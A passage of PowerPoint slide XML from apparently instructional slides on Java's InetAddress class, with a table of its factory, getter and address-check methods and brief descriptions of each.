            <a:ext cx="4038600" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. Instance Methods: Non-static, perform operations </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(e.g., reachability tests)  or computations using the state of a specific object.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="76200"/>
            <a:ext cx="8229600" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" kern="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> Methods Types</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7924800" y="4767897"/>
            <a:ext cx="4038600" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>3. Getter Methods: Non-static, return IP/hostname data, provides read-only access to an object’s internal state.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="85168" y="4572000"/>
            <a:ext cx="3991532" cy="2067213"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4076701" y="4581164"/>
            <a:ext cx="3467100" cy="20580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graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="410632" y="136525"/>
          <a:ext cx="11476567" cy="6456218"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1503826"/>
                <a:gridCol w="4432329"/>
                <a:gridCol w="5540412"/>
              </a:tblGrid>
              <a:tr h="195645">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Type</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>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b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1">
                        <a:solidFill>
                          <a:srgbClr val="40404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b="1">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Description</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1">
                        <a:solidFill>
                          <a:srgbClr val="40404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r>
                        <a:rPr lang="en-US" sz="1200" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Factory Methods (Static)</a:t>
                      </a:r>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solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getByName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(String host)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF000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Creates an InetAddress from a hostname (DNS lookup).</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solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getByAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(byte[] </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>addr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF000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Creates from raw IP bytes (no DNS).</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0703">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solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getByAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(String host, byte[] </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>addr</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF000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Binds a hostname to an IP (no DNS).</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solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>[] </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getAllByName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(String host)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF000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Returns all IPs for a host (multi-homed DNS).</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solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>static </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>InetAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getLocalHost</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF000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Returns the local machine's IP/hostname.</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r>
                        <a:rPr lang="en-US" sz="1200" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Getter Methods (Instance)</a:t>
                      </a:r>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effectLst/>
                        </a:rPr>
                        <a:t>String </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getHostName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">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Returns the hostname (may trigger reverse DNS).</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effectLst/>
                        </a:rPr>
                        <a:t>String </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getCanonicalHostName</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">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Returns the full DNS-resolved hostname (e.g., with aliases).</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effectLst/>
                        </a:rPr>
                        <a:t>String </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getHostAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">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Returns the IP as a string (e.g., "192.168.1.1").</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effectLst/>
                        </a:rPr>
                        <a:t>byte[] </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>getAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">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Returns the raw IP bytes (IPv4: 4 bytes, IPv6: 16 bytes).</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r>
                        <a:rPr lang="en-US" sz="1200" b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Instance Methods (Behavior)</a:t>
                      </a:r>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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isReachable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(int timeout)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B05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Tests if the host is reachable (ICMP/ping).</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0703">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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isReachable</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>NetworkInterface</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>netif</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>, int </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>ttl</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>, int timeout)</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B05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Tests reachability via a specific network interface.</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isAnyLocalAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B05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Checks if the IP is a wildcard address (0.0.0.0 or ::).</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isLoopbackAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B05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Checks if the IP is loopback (e.g., 127.0.0.1 or ::1).</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isLinkLocalAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B05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Checks if the IP is link-local (e.g., 169.254.x.x or fe80::).</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isSiteLocalAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B05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Checks if the IP is site-local (private ranges like 192.168.x.x).</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175">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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isMulticastAddress</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B05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effectLst/>
                        </a:rPr>
                        <a:t>Checks if the IP is multicast (e.g., 224.0.0.0/4 or ff00::/8).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1">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0703">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="en-US" sz="1200" b="1">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="32201"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err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>boolean</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isMCGlobal</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(), </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isMCLinkLocal</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(), </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>isMCNodeLocal</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="00B050"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>(), etc.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="00B050"/>
                        </a:solidFill>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effectLst/>
                        </a:rPr>
                        <a:t>Checks multicast scope (IPv6-specific).</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1200" b="1" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46007" marR="46007" marT="23003" marB="230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4800" y="76200"/>
            <a:ext cx="8229600" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600" b="1" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
